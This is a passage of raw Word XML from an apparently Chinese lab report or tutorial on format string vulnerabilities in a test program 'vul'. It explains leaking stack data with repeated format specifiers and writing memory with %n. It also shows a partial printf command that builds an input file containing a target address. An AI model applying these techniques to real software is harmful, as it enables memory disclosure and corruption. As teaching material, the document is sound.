          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>布局。如图</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>所示是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>中漏洞程序的</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>栈</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>帧布局。其中最重要的部分是</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指针的起始位置。在</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函数中，可变参数的起始位置在格式化字符串参数的正上方，这也是</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指针的起始位置。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EBDDFAA" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="420"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5FCE1972" wp14:editId="00B30156">
            <wp:extent cx="3870325" cy="33223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878344" cy="3328765"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="653A4C7B" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:cs="Tahom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3</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>vul</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>栈</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>帧布局</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0894EEB7"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由第一个实验我们可以知道，当可变参数不足时，</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函数仍然会继续匹配</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>栈</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>上的数据，从而可能导致秘密信息的泄露。在进行漏洞利用时，为了弄清需要多少个格式规定符，我们需要计算秘密信息到</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初始位置的距离，但实际操作时使用我们可以使用试错法，如图</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>所示，一次性输入较多格式规定符来泄露</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>栈</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>上数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5496A8C3" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="420"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6E46E854" wp14:editId="314BBF2D">
            <wp:extent cx="4581525" cy="13239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581525" cy="1323975"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="32D52937" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>图</w:t>
      </w:r>
      <w:r>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xml:space="preserve">SEQ </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:instrText>图</w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> \* ARABIC</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4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>利用格式化字符串漏洞泄露</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>栈</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>上数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="369AFDCB"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格式化字符串漏洞更强大之处在于它可以修改内存中的数据，这是基于</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中的</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格式规定符：</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会将目前已打印出的字符的个数写入内存，如执行</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proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>hello%n</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>”,&amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>，会先打印出</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ello</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>，这时打印出</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>个字符，会将</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>保存至变量</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>必须提供</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>的地址</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73073447"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从</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>%n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>的使用方法可以看出，当</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函数遇到</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时，它获取</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指针指向的值，视该值为一个内存地址，然后将数据写入该地址。因此我们要修改某个变量值，首先要把该变量的地址放入</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>栈</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>中。因为用户的输入会被保存在</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>栈</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>中，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>因此我们可以选择在输入中加入</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>var</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>的地址。但变量的地址一般不是可打印字符，难以输入，这里提供一种初级的方法：将所输入内容保存到文件中，然后令漏洞程序从文件中获取输入，具体操作过程如下所示。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="766D7855" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:commentRangeStart w:id="32"/>
      <w:commentRangeStart w:id="33"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>假设所修改变量的地址为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>bffff304</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>，在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ash</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>中使用以下命令</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:commentRangeEnd w:id="32"/>
      <w:r>
        <w:commentReference w:id="32"/>
      </w:r>
      <w:commentRangeEnd w:id="33"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="af1"/>
        </w:rPr>
        <w:commentReference w:id="33"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5467250E" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="420"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251665408" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="41F1EC80" wp14:editId="790ACB74">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>1445260</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>852170</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4989830" cy="501650"/>
                <wp:effectExtent l="4445" t="4445" r="9525" b="14605"/>
                <wp:wrapTopAndBottom/>
                <wp:docPr id="23" name="文本框 23"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="4989830" cy="501650"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="6109" cap="flat" cmpd="sng">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                          <a:miter/>
                          <a:headEnd type="none" w="med" len="med"/>
                          <a:tailEnd type="none" w="med" len="med"/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="196E0681"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r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>./</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>vul</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> &lt; input</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="2CFC4241" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:spacing w:before="75"/>
                              <w:ind w:left="102"/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="648684B6" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:wordWrap w:val="0"/>
                              <w:spacing w:before="75"/>
                              <w:ind w:left="103"/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="179E36CD" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:wordWrap w:val="0"/>
                              <w:spacing w:before="75"/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="2BA9138A" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:wordWrap w:val="0"/>
                              <w:spacing w:before="75"/>
                              <w:ind w:left="103"/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="105F7066" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A"/>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr lIns="0" tIns="0" rIns="0" bIns="0" upright="1"/>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shape w14:anchorId="41F1EC80" id="文本框 23" o:spid="_x0000_s1029" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:113.8pt;margin-top:67.1pt;width:392.9pt;height:39.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" filled="f" strokeweight=".16969mm">
                <v:textbox inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="196E0681"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r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>./</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>vul</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> &lt; input</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="2CFC4241" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:spacing w:before="75"/>
                        <w:ind w:left="102"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="648684B6" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:wordWrap w:val="0"/>
                        <w:spacing w:before="75"/>
                        <w:ind w:left="103"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="179E36CD" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:wordWrap w:val="0"/>
                        <w:spacing w:before="75"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="2BA9138A" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:wordWrap w:val="0"/>
                        <w:spacing w:before="75"/>
                        <w:ind w:left="103"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="105F7066" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A"/>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="page"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251664384" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2E2C22FE" wp14:editId="6E473BDE">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>1465580</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>12700</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4989830" cy="501650"/>
                <wp:effectExtent l="4445" t="4445" r="9525" b="14605"/>
                <wp:wrapTopAndBottom/>
                <wp:docPr id="22" name="文本框 22"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="4989830" cy="501650"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="6109" cap="flat" cmpd="sng">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                          <a:miter/>
                          <a:headEnd type="none" w="med" len="med"/>
                          <a:tailEnd type="none" w="med" len="med"/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="18A1E252"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r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>echo $(</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>printf</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> "\x04\xf3\</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
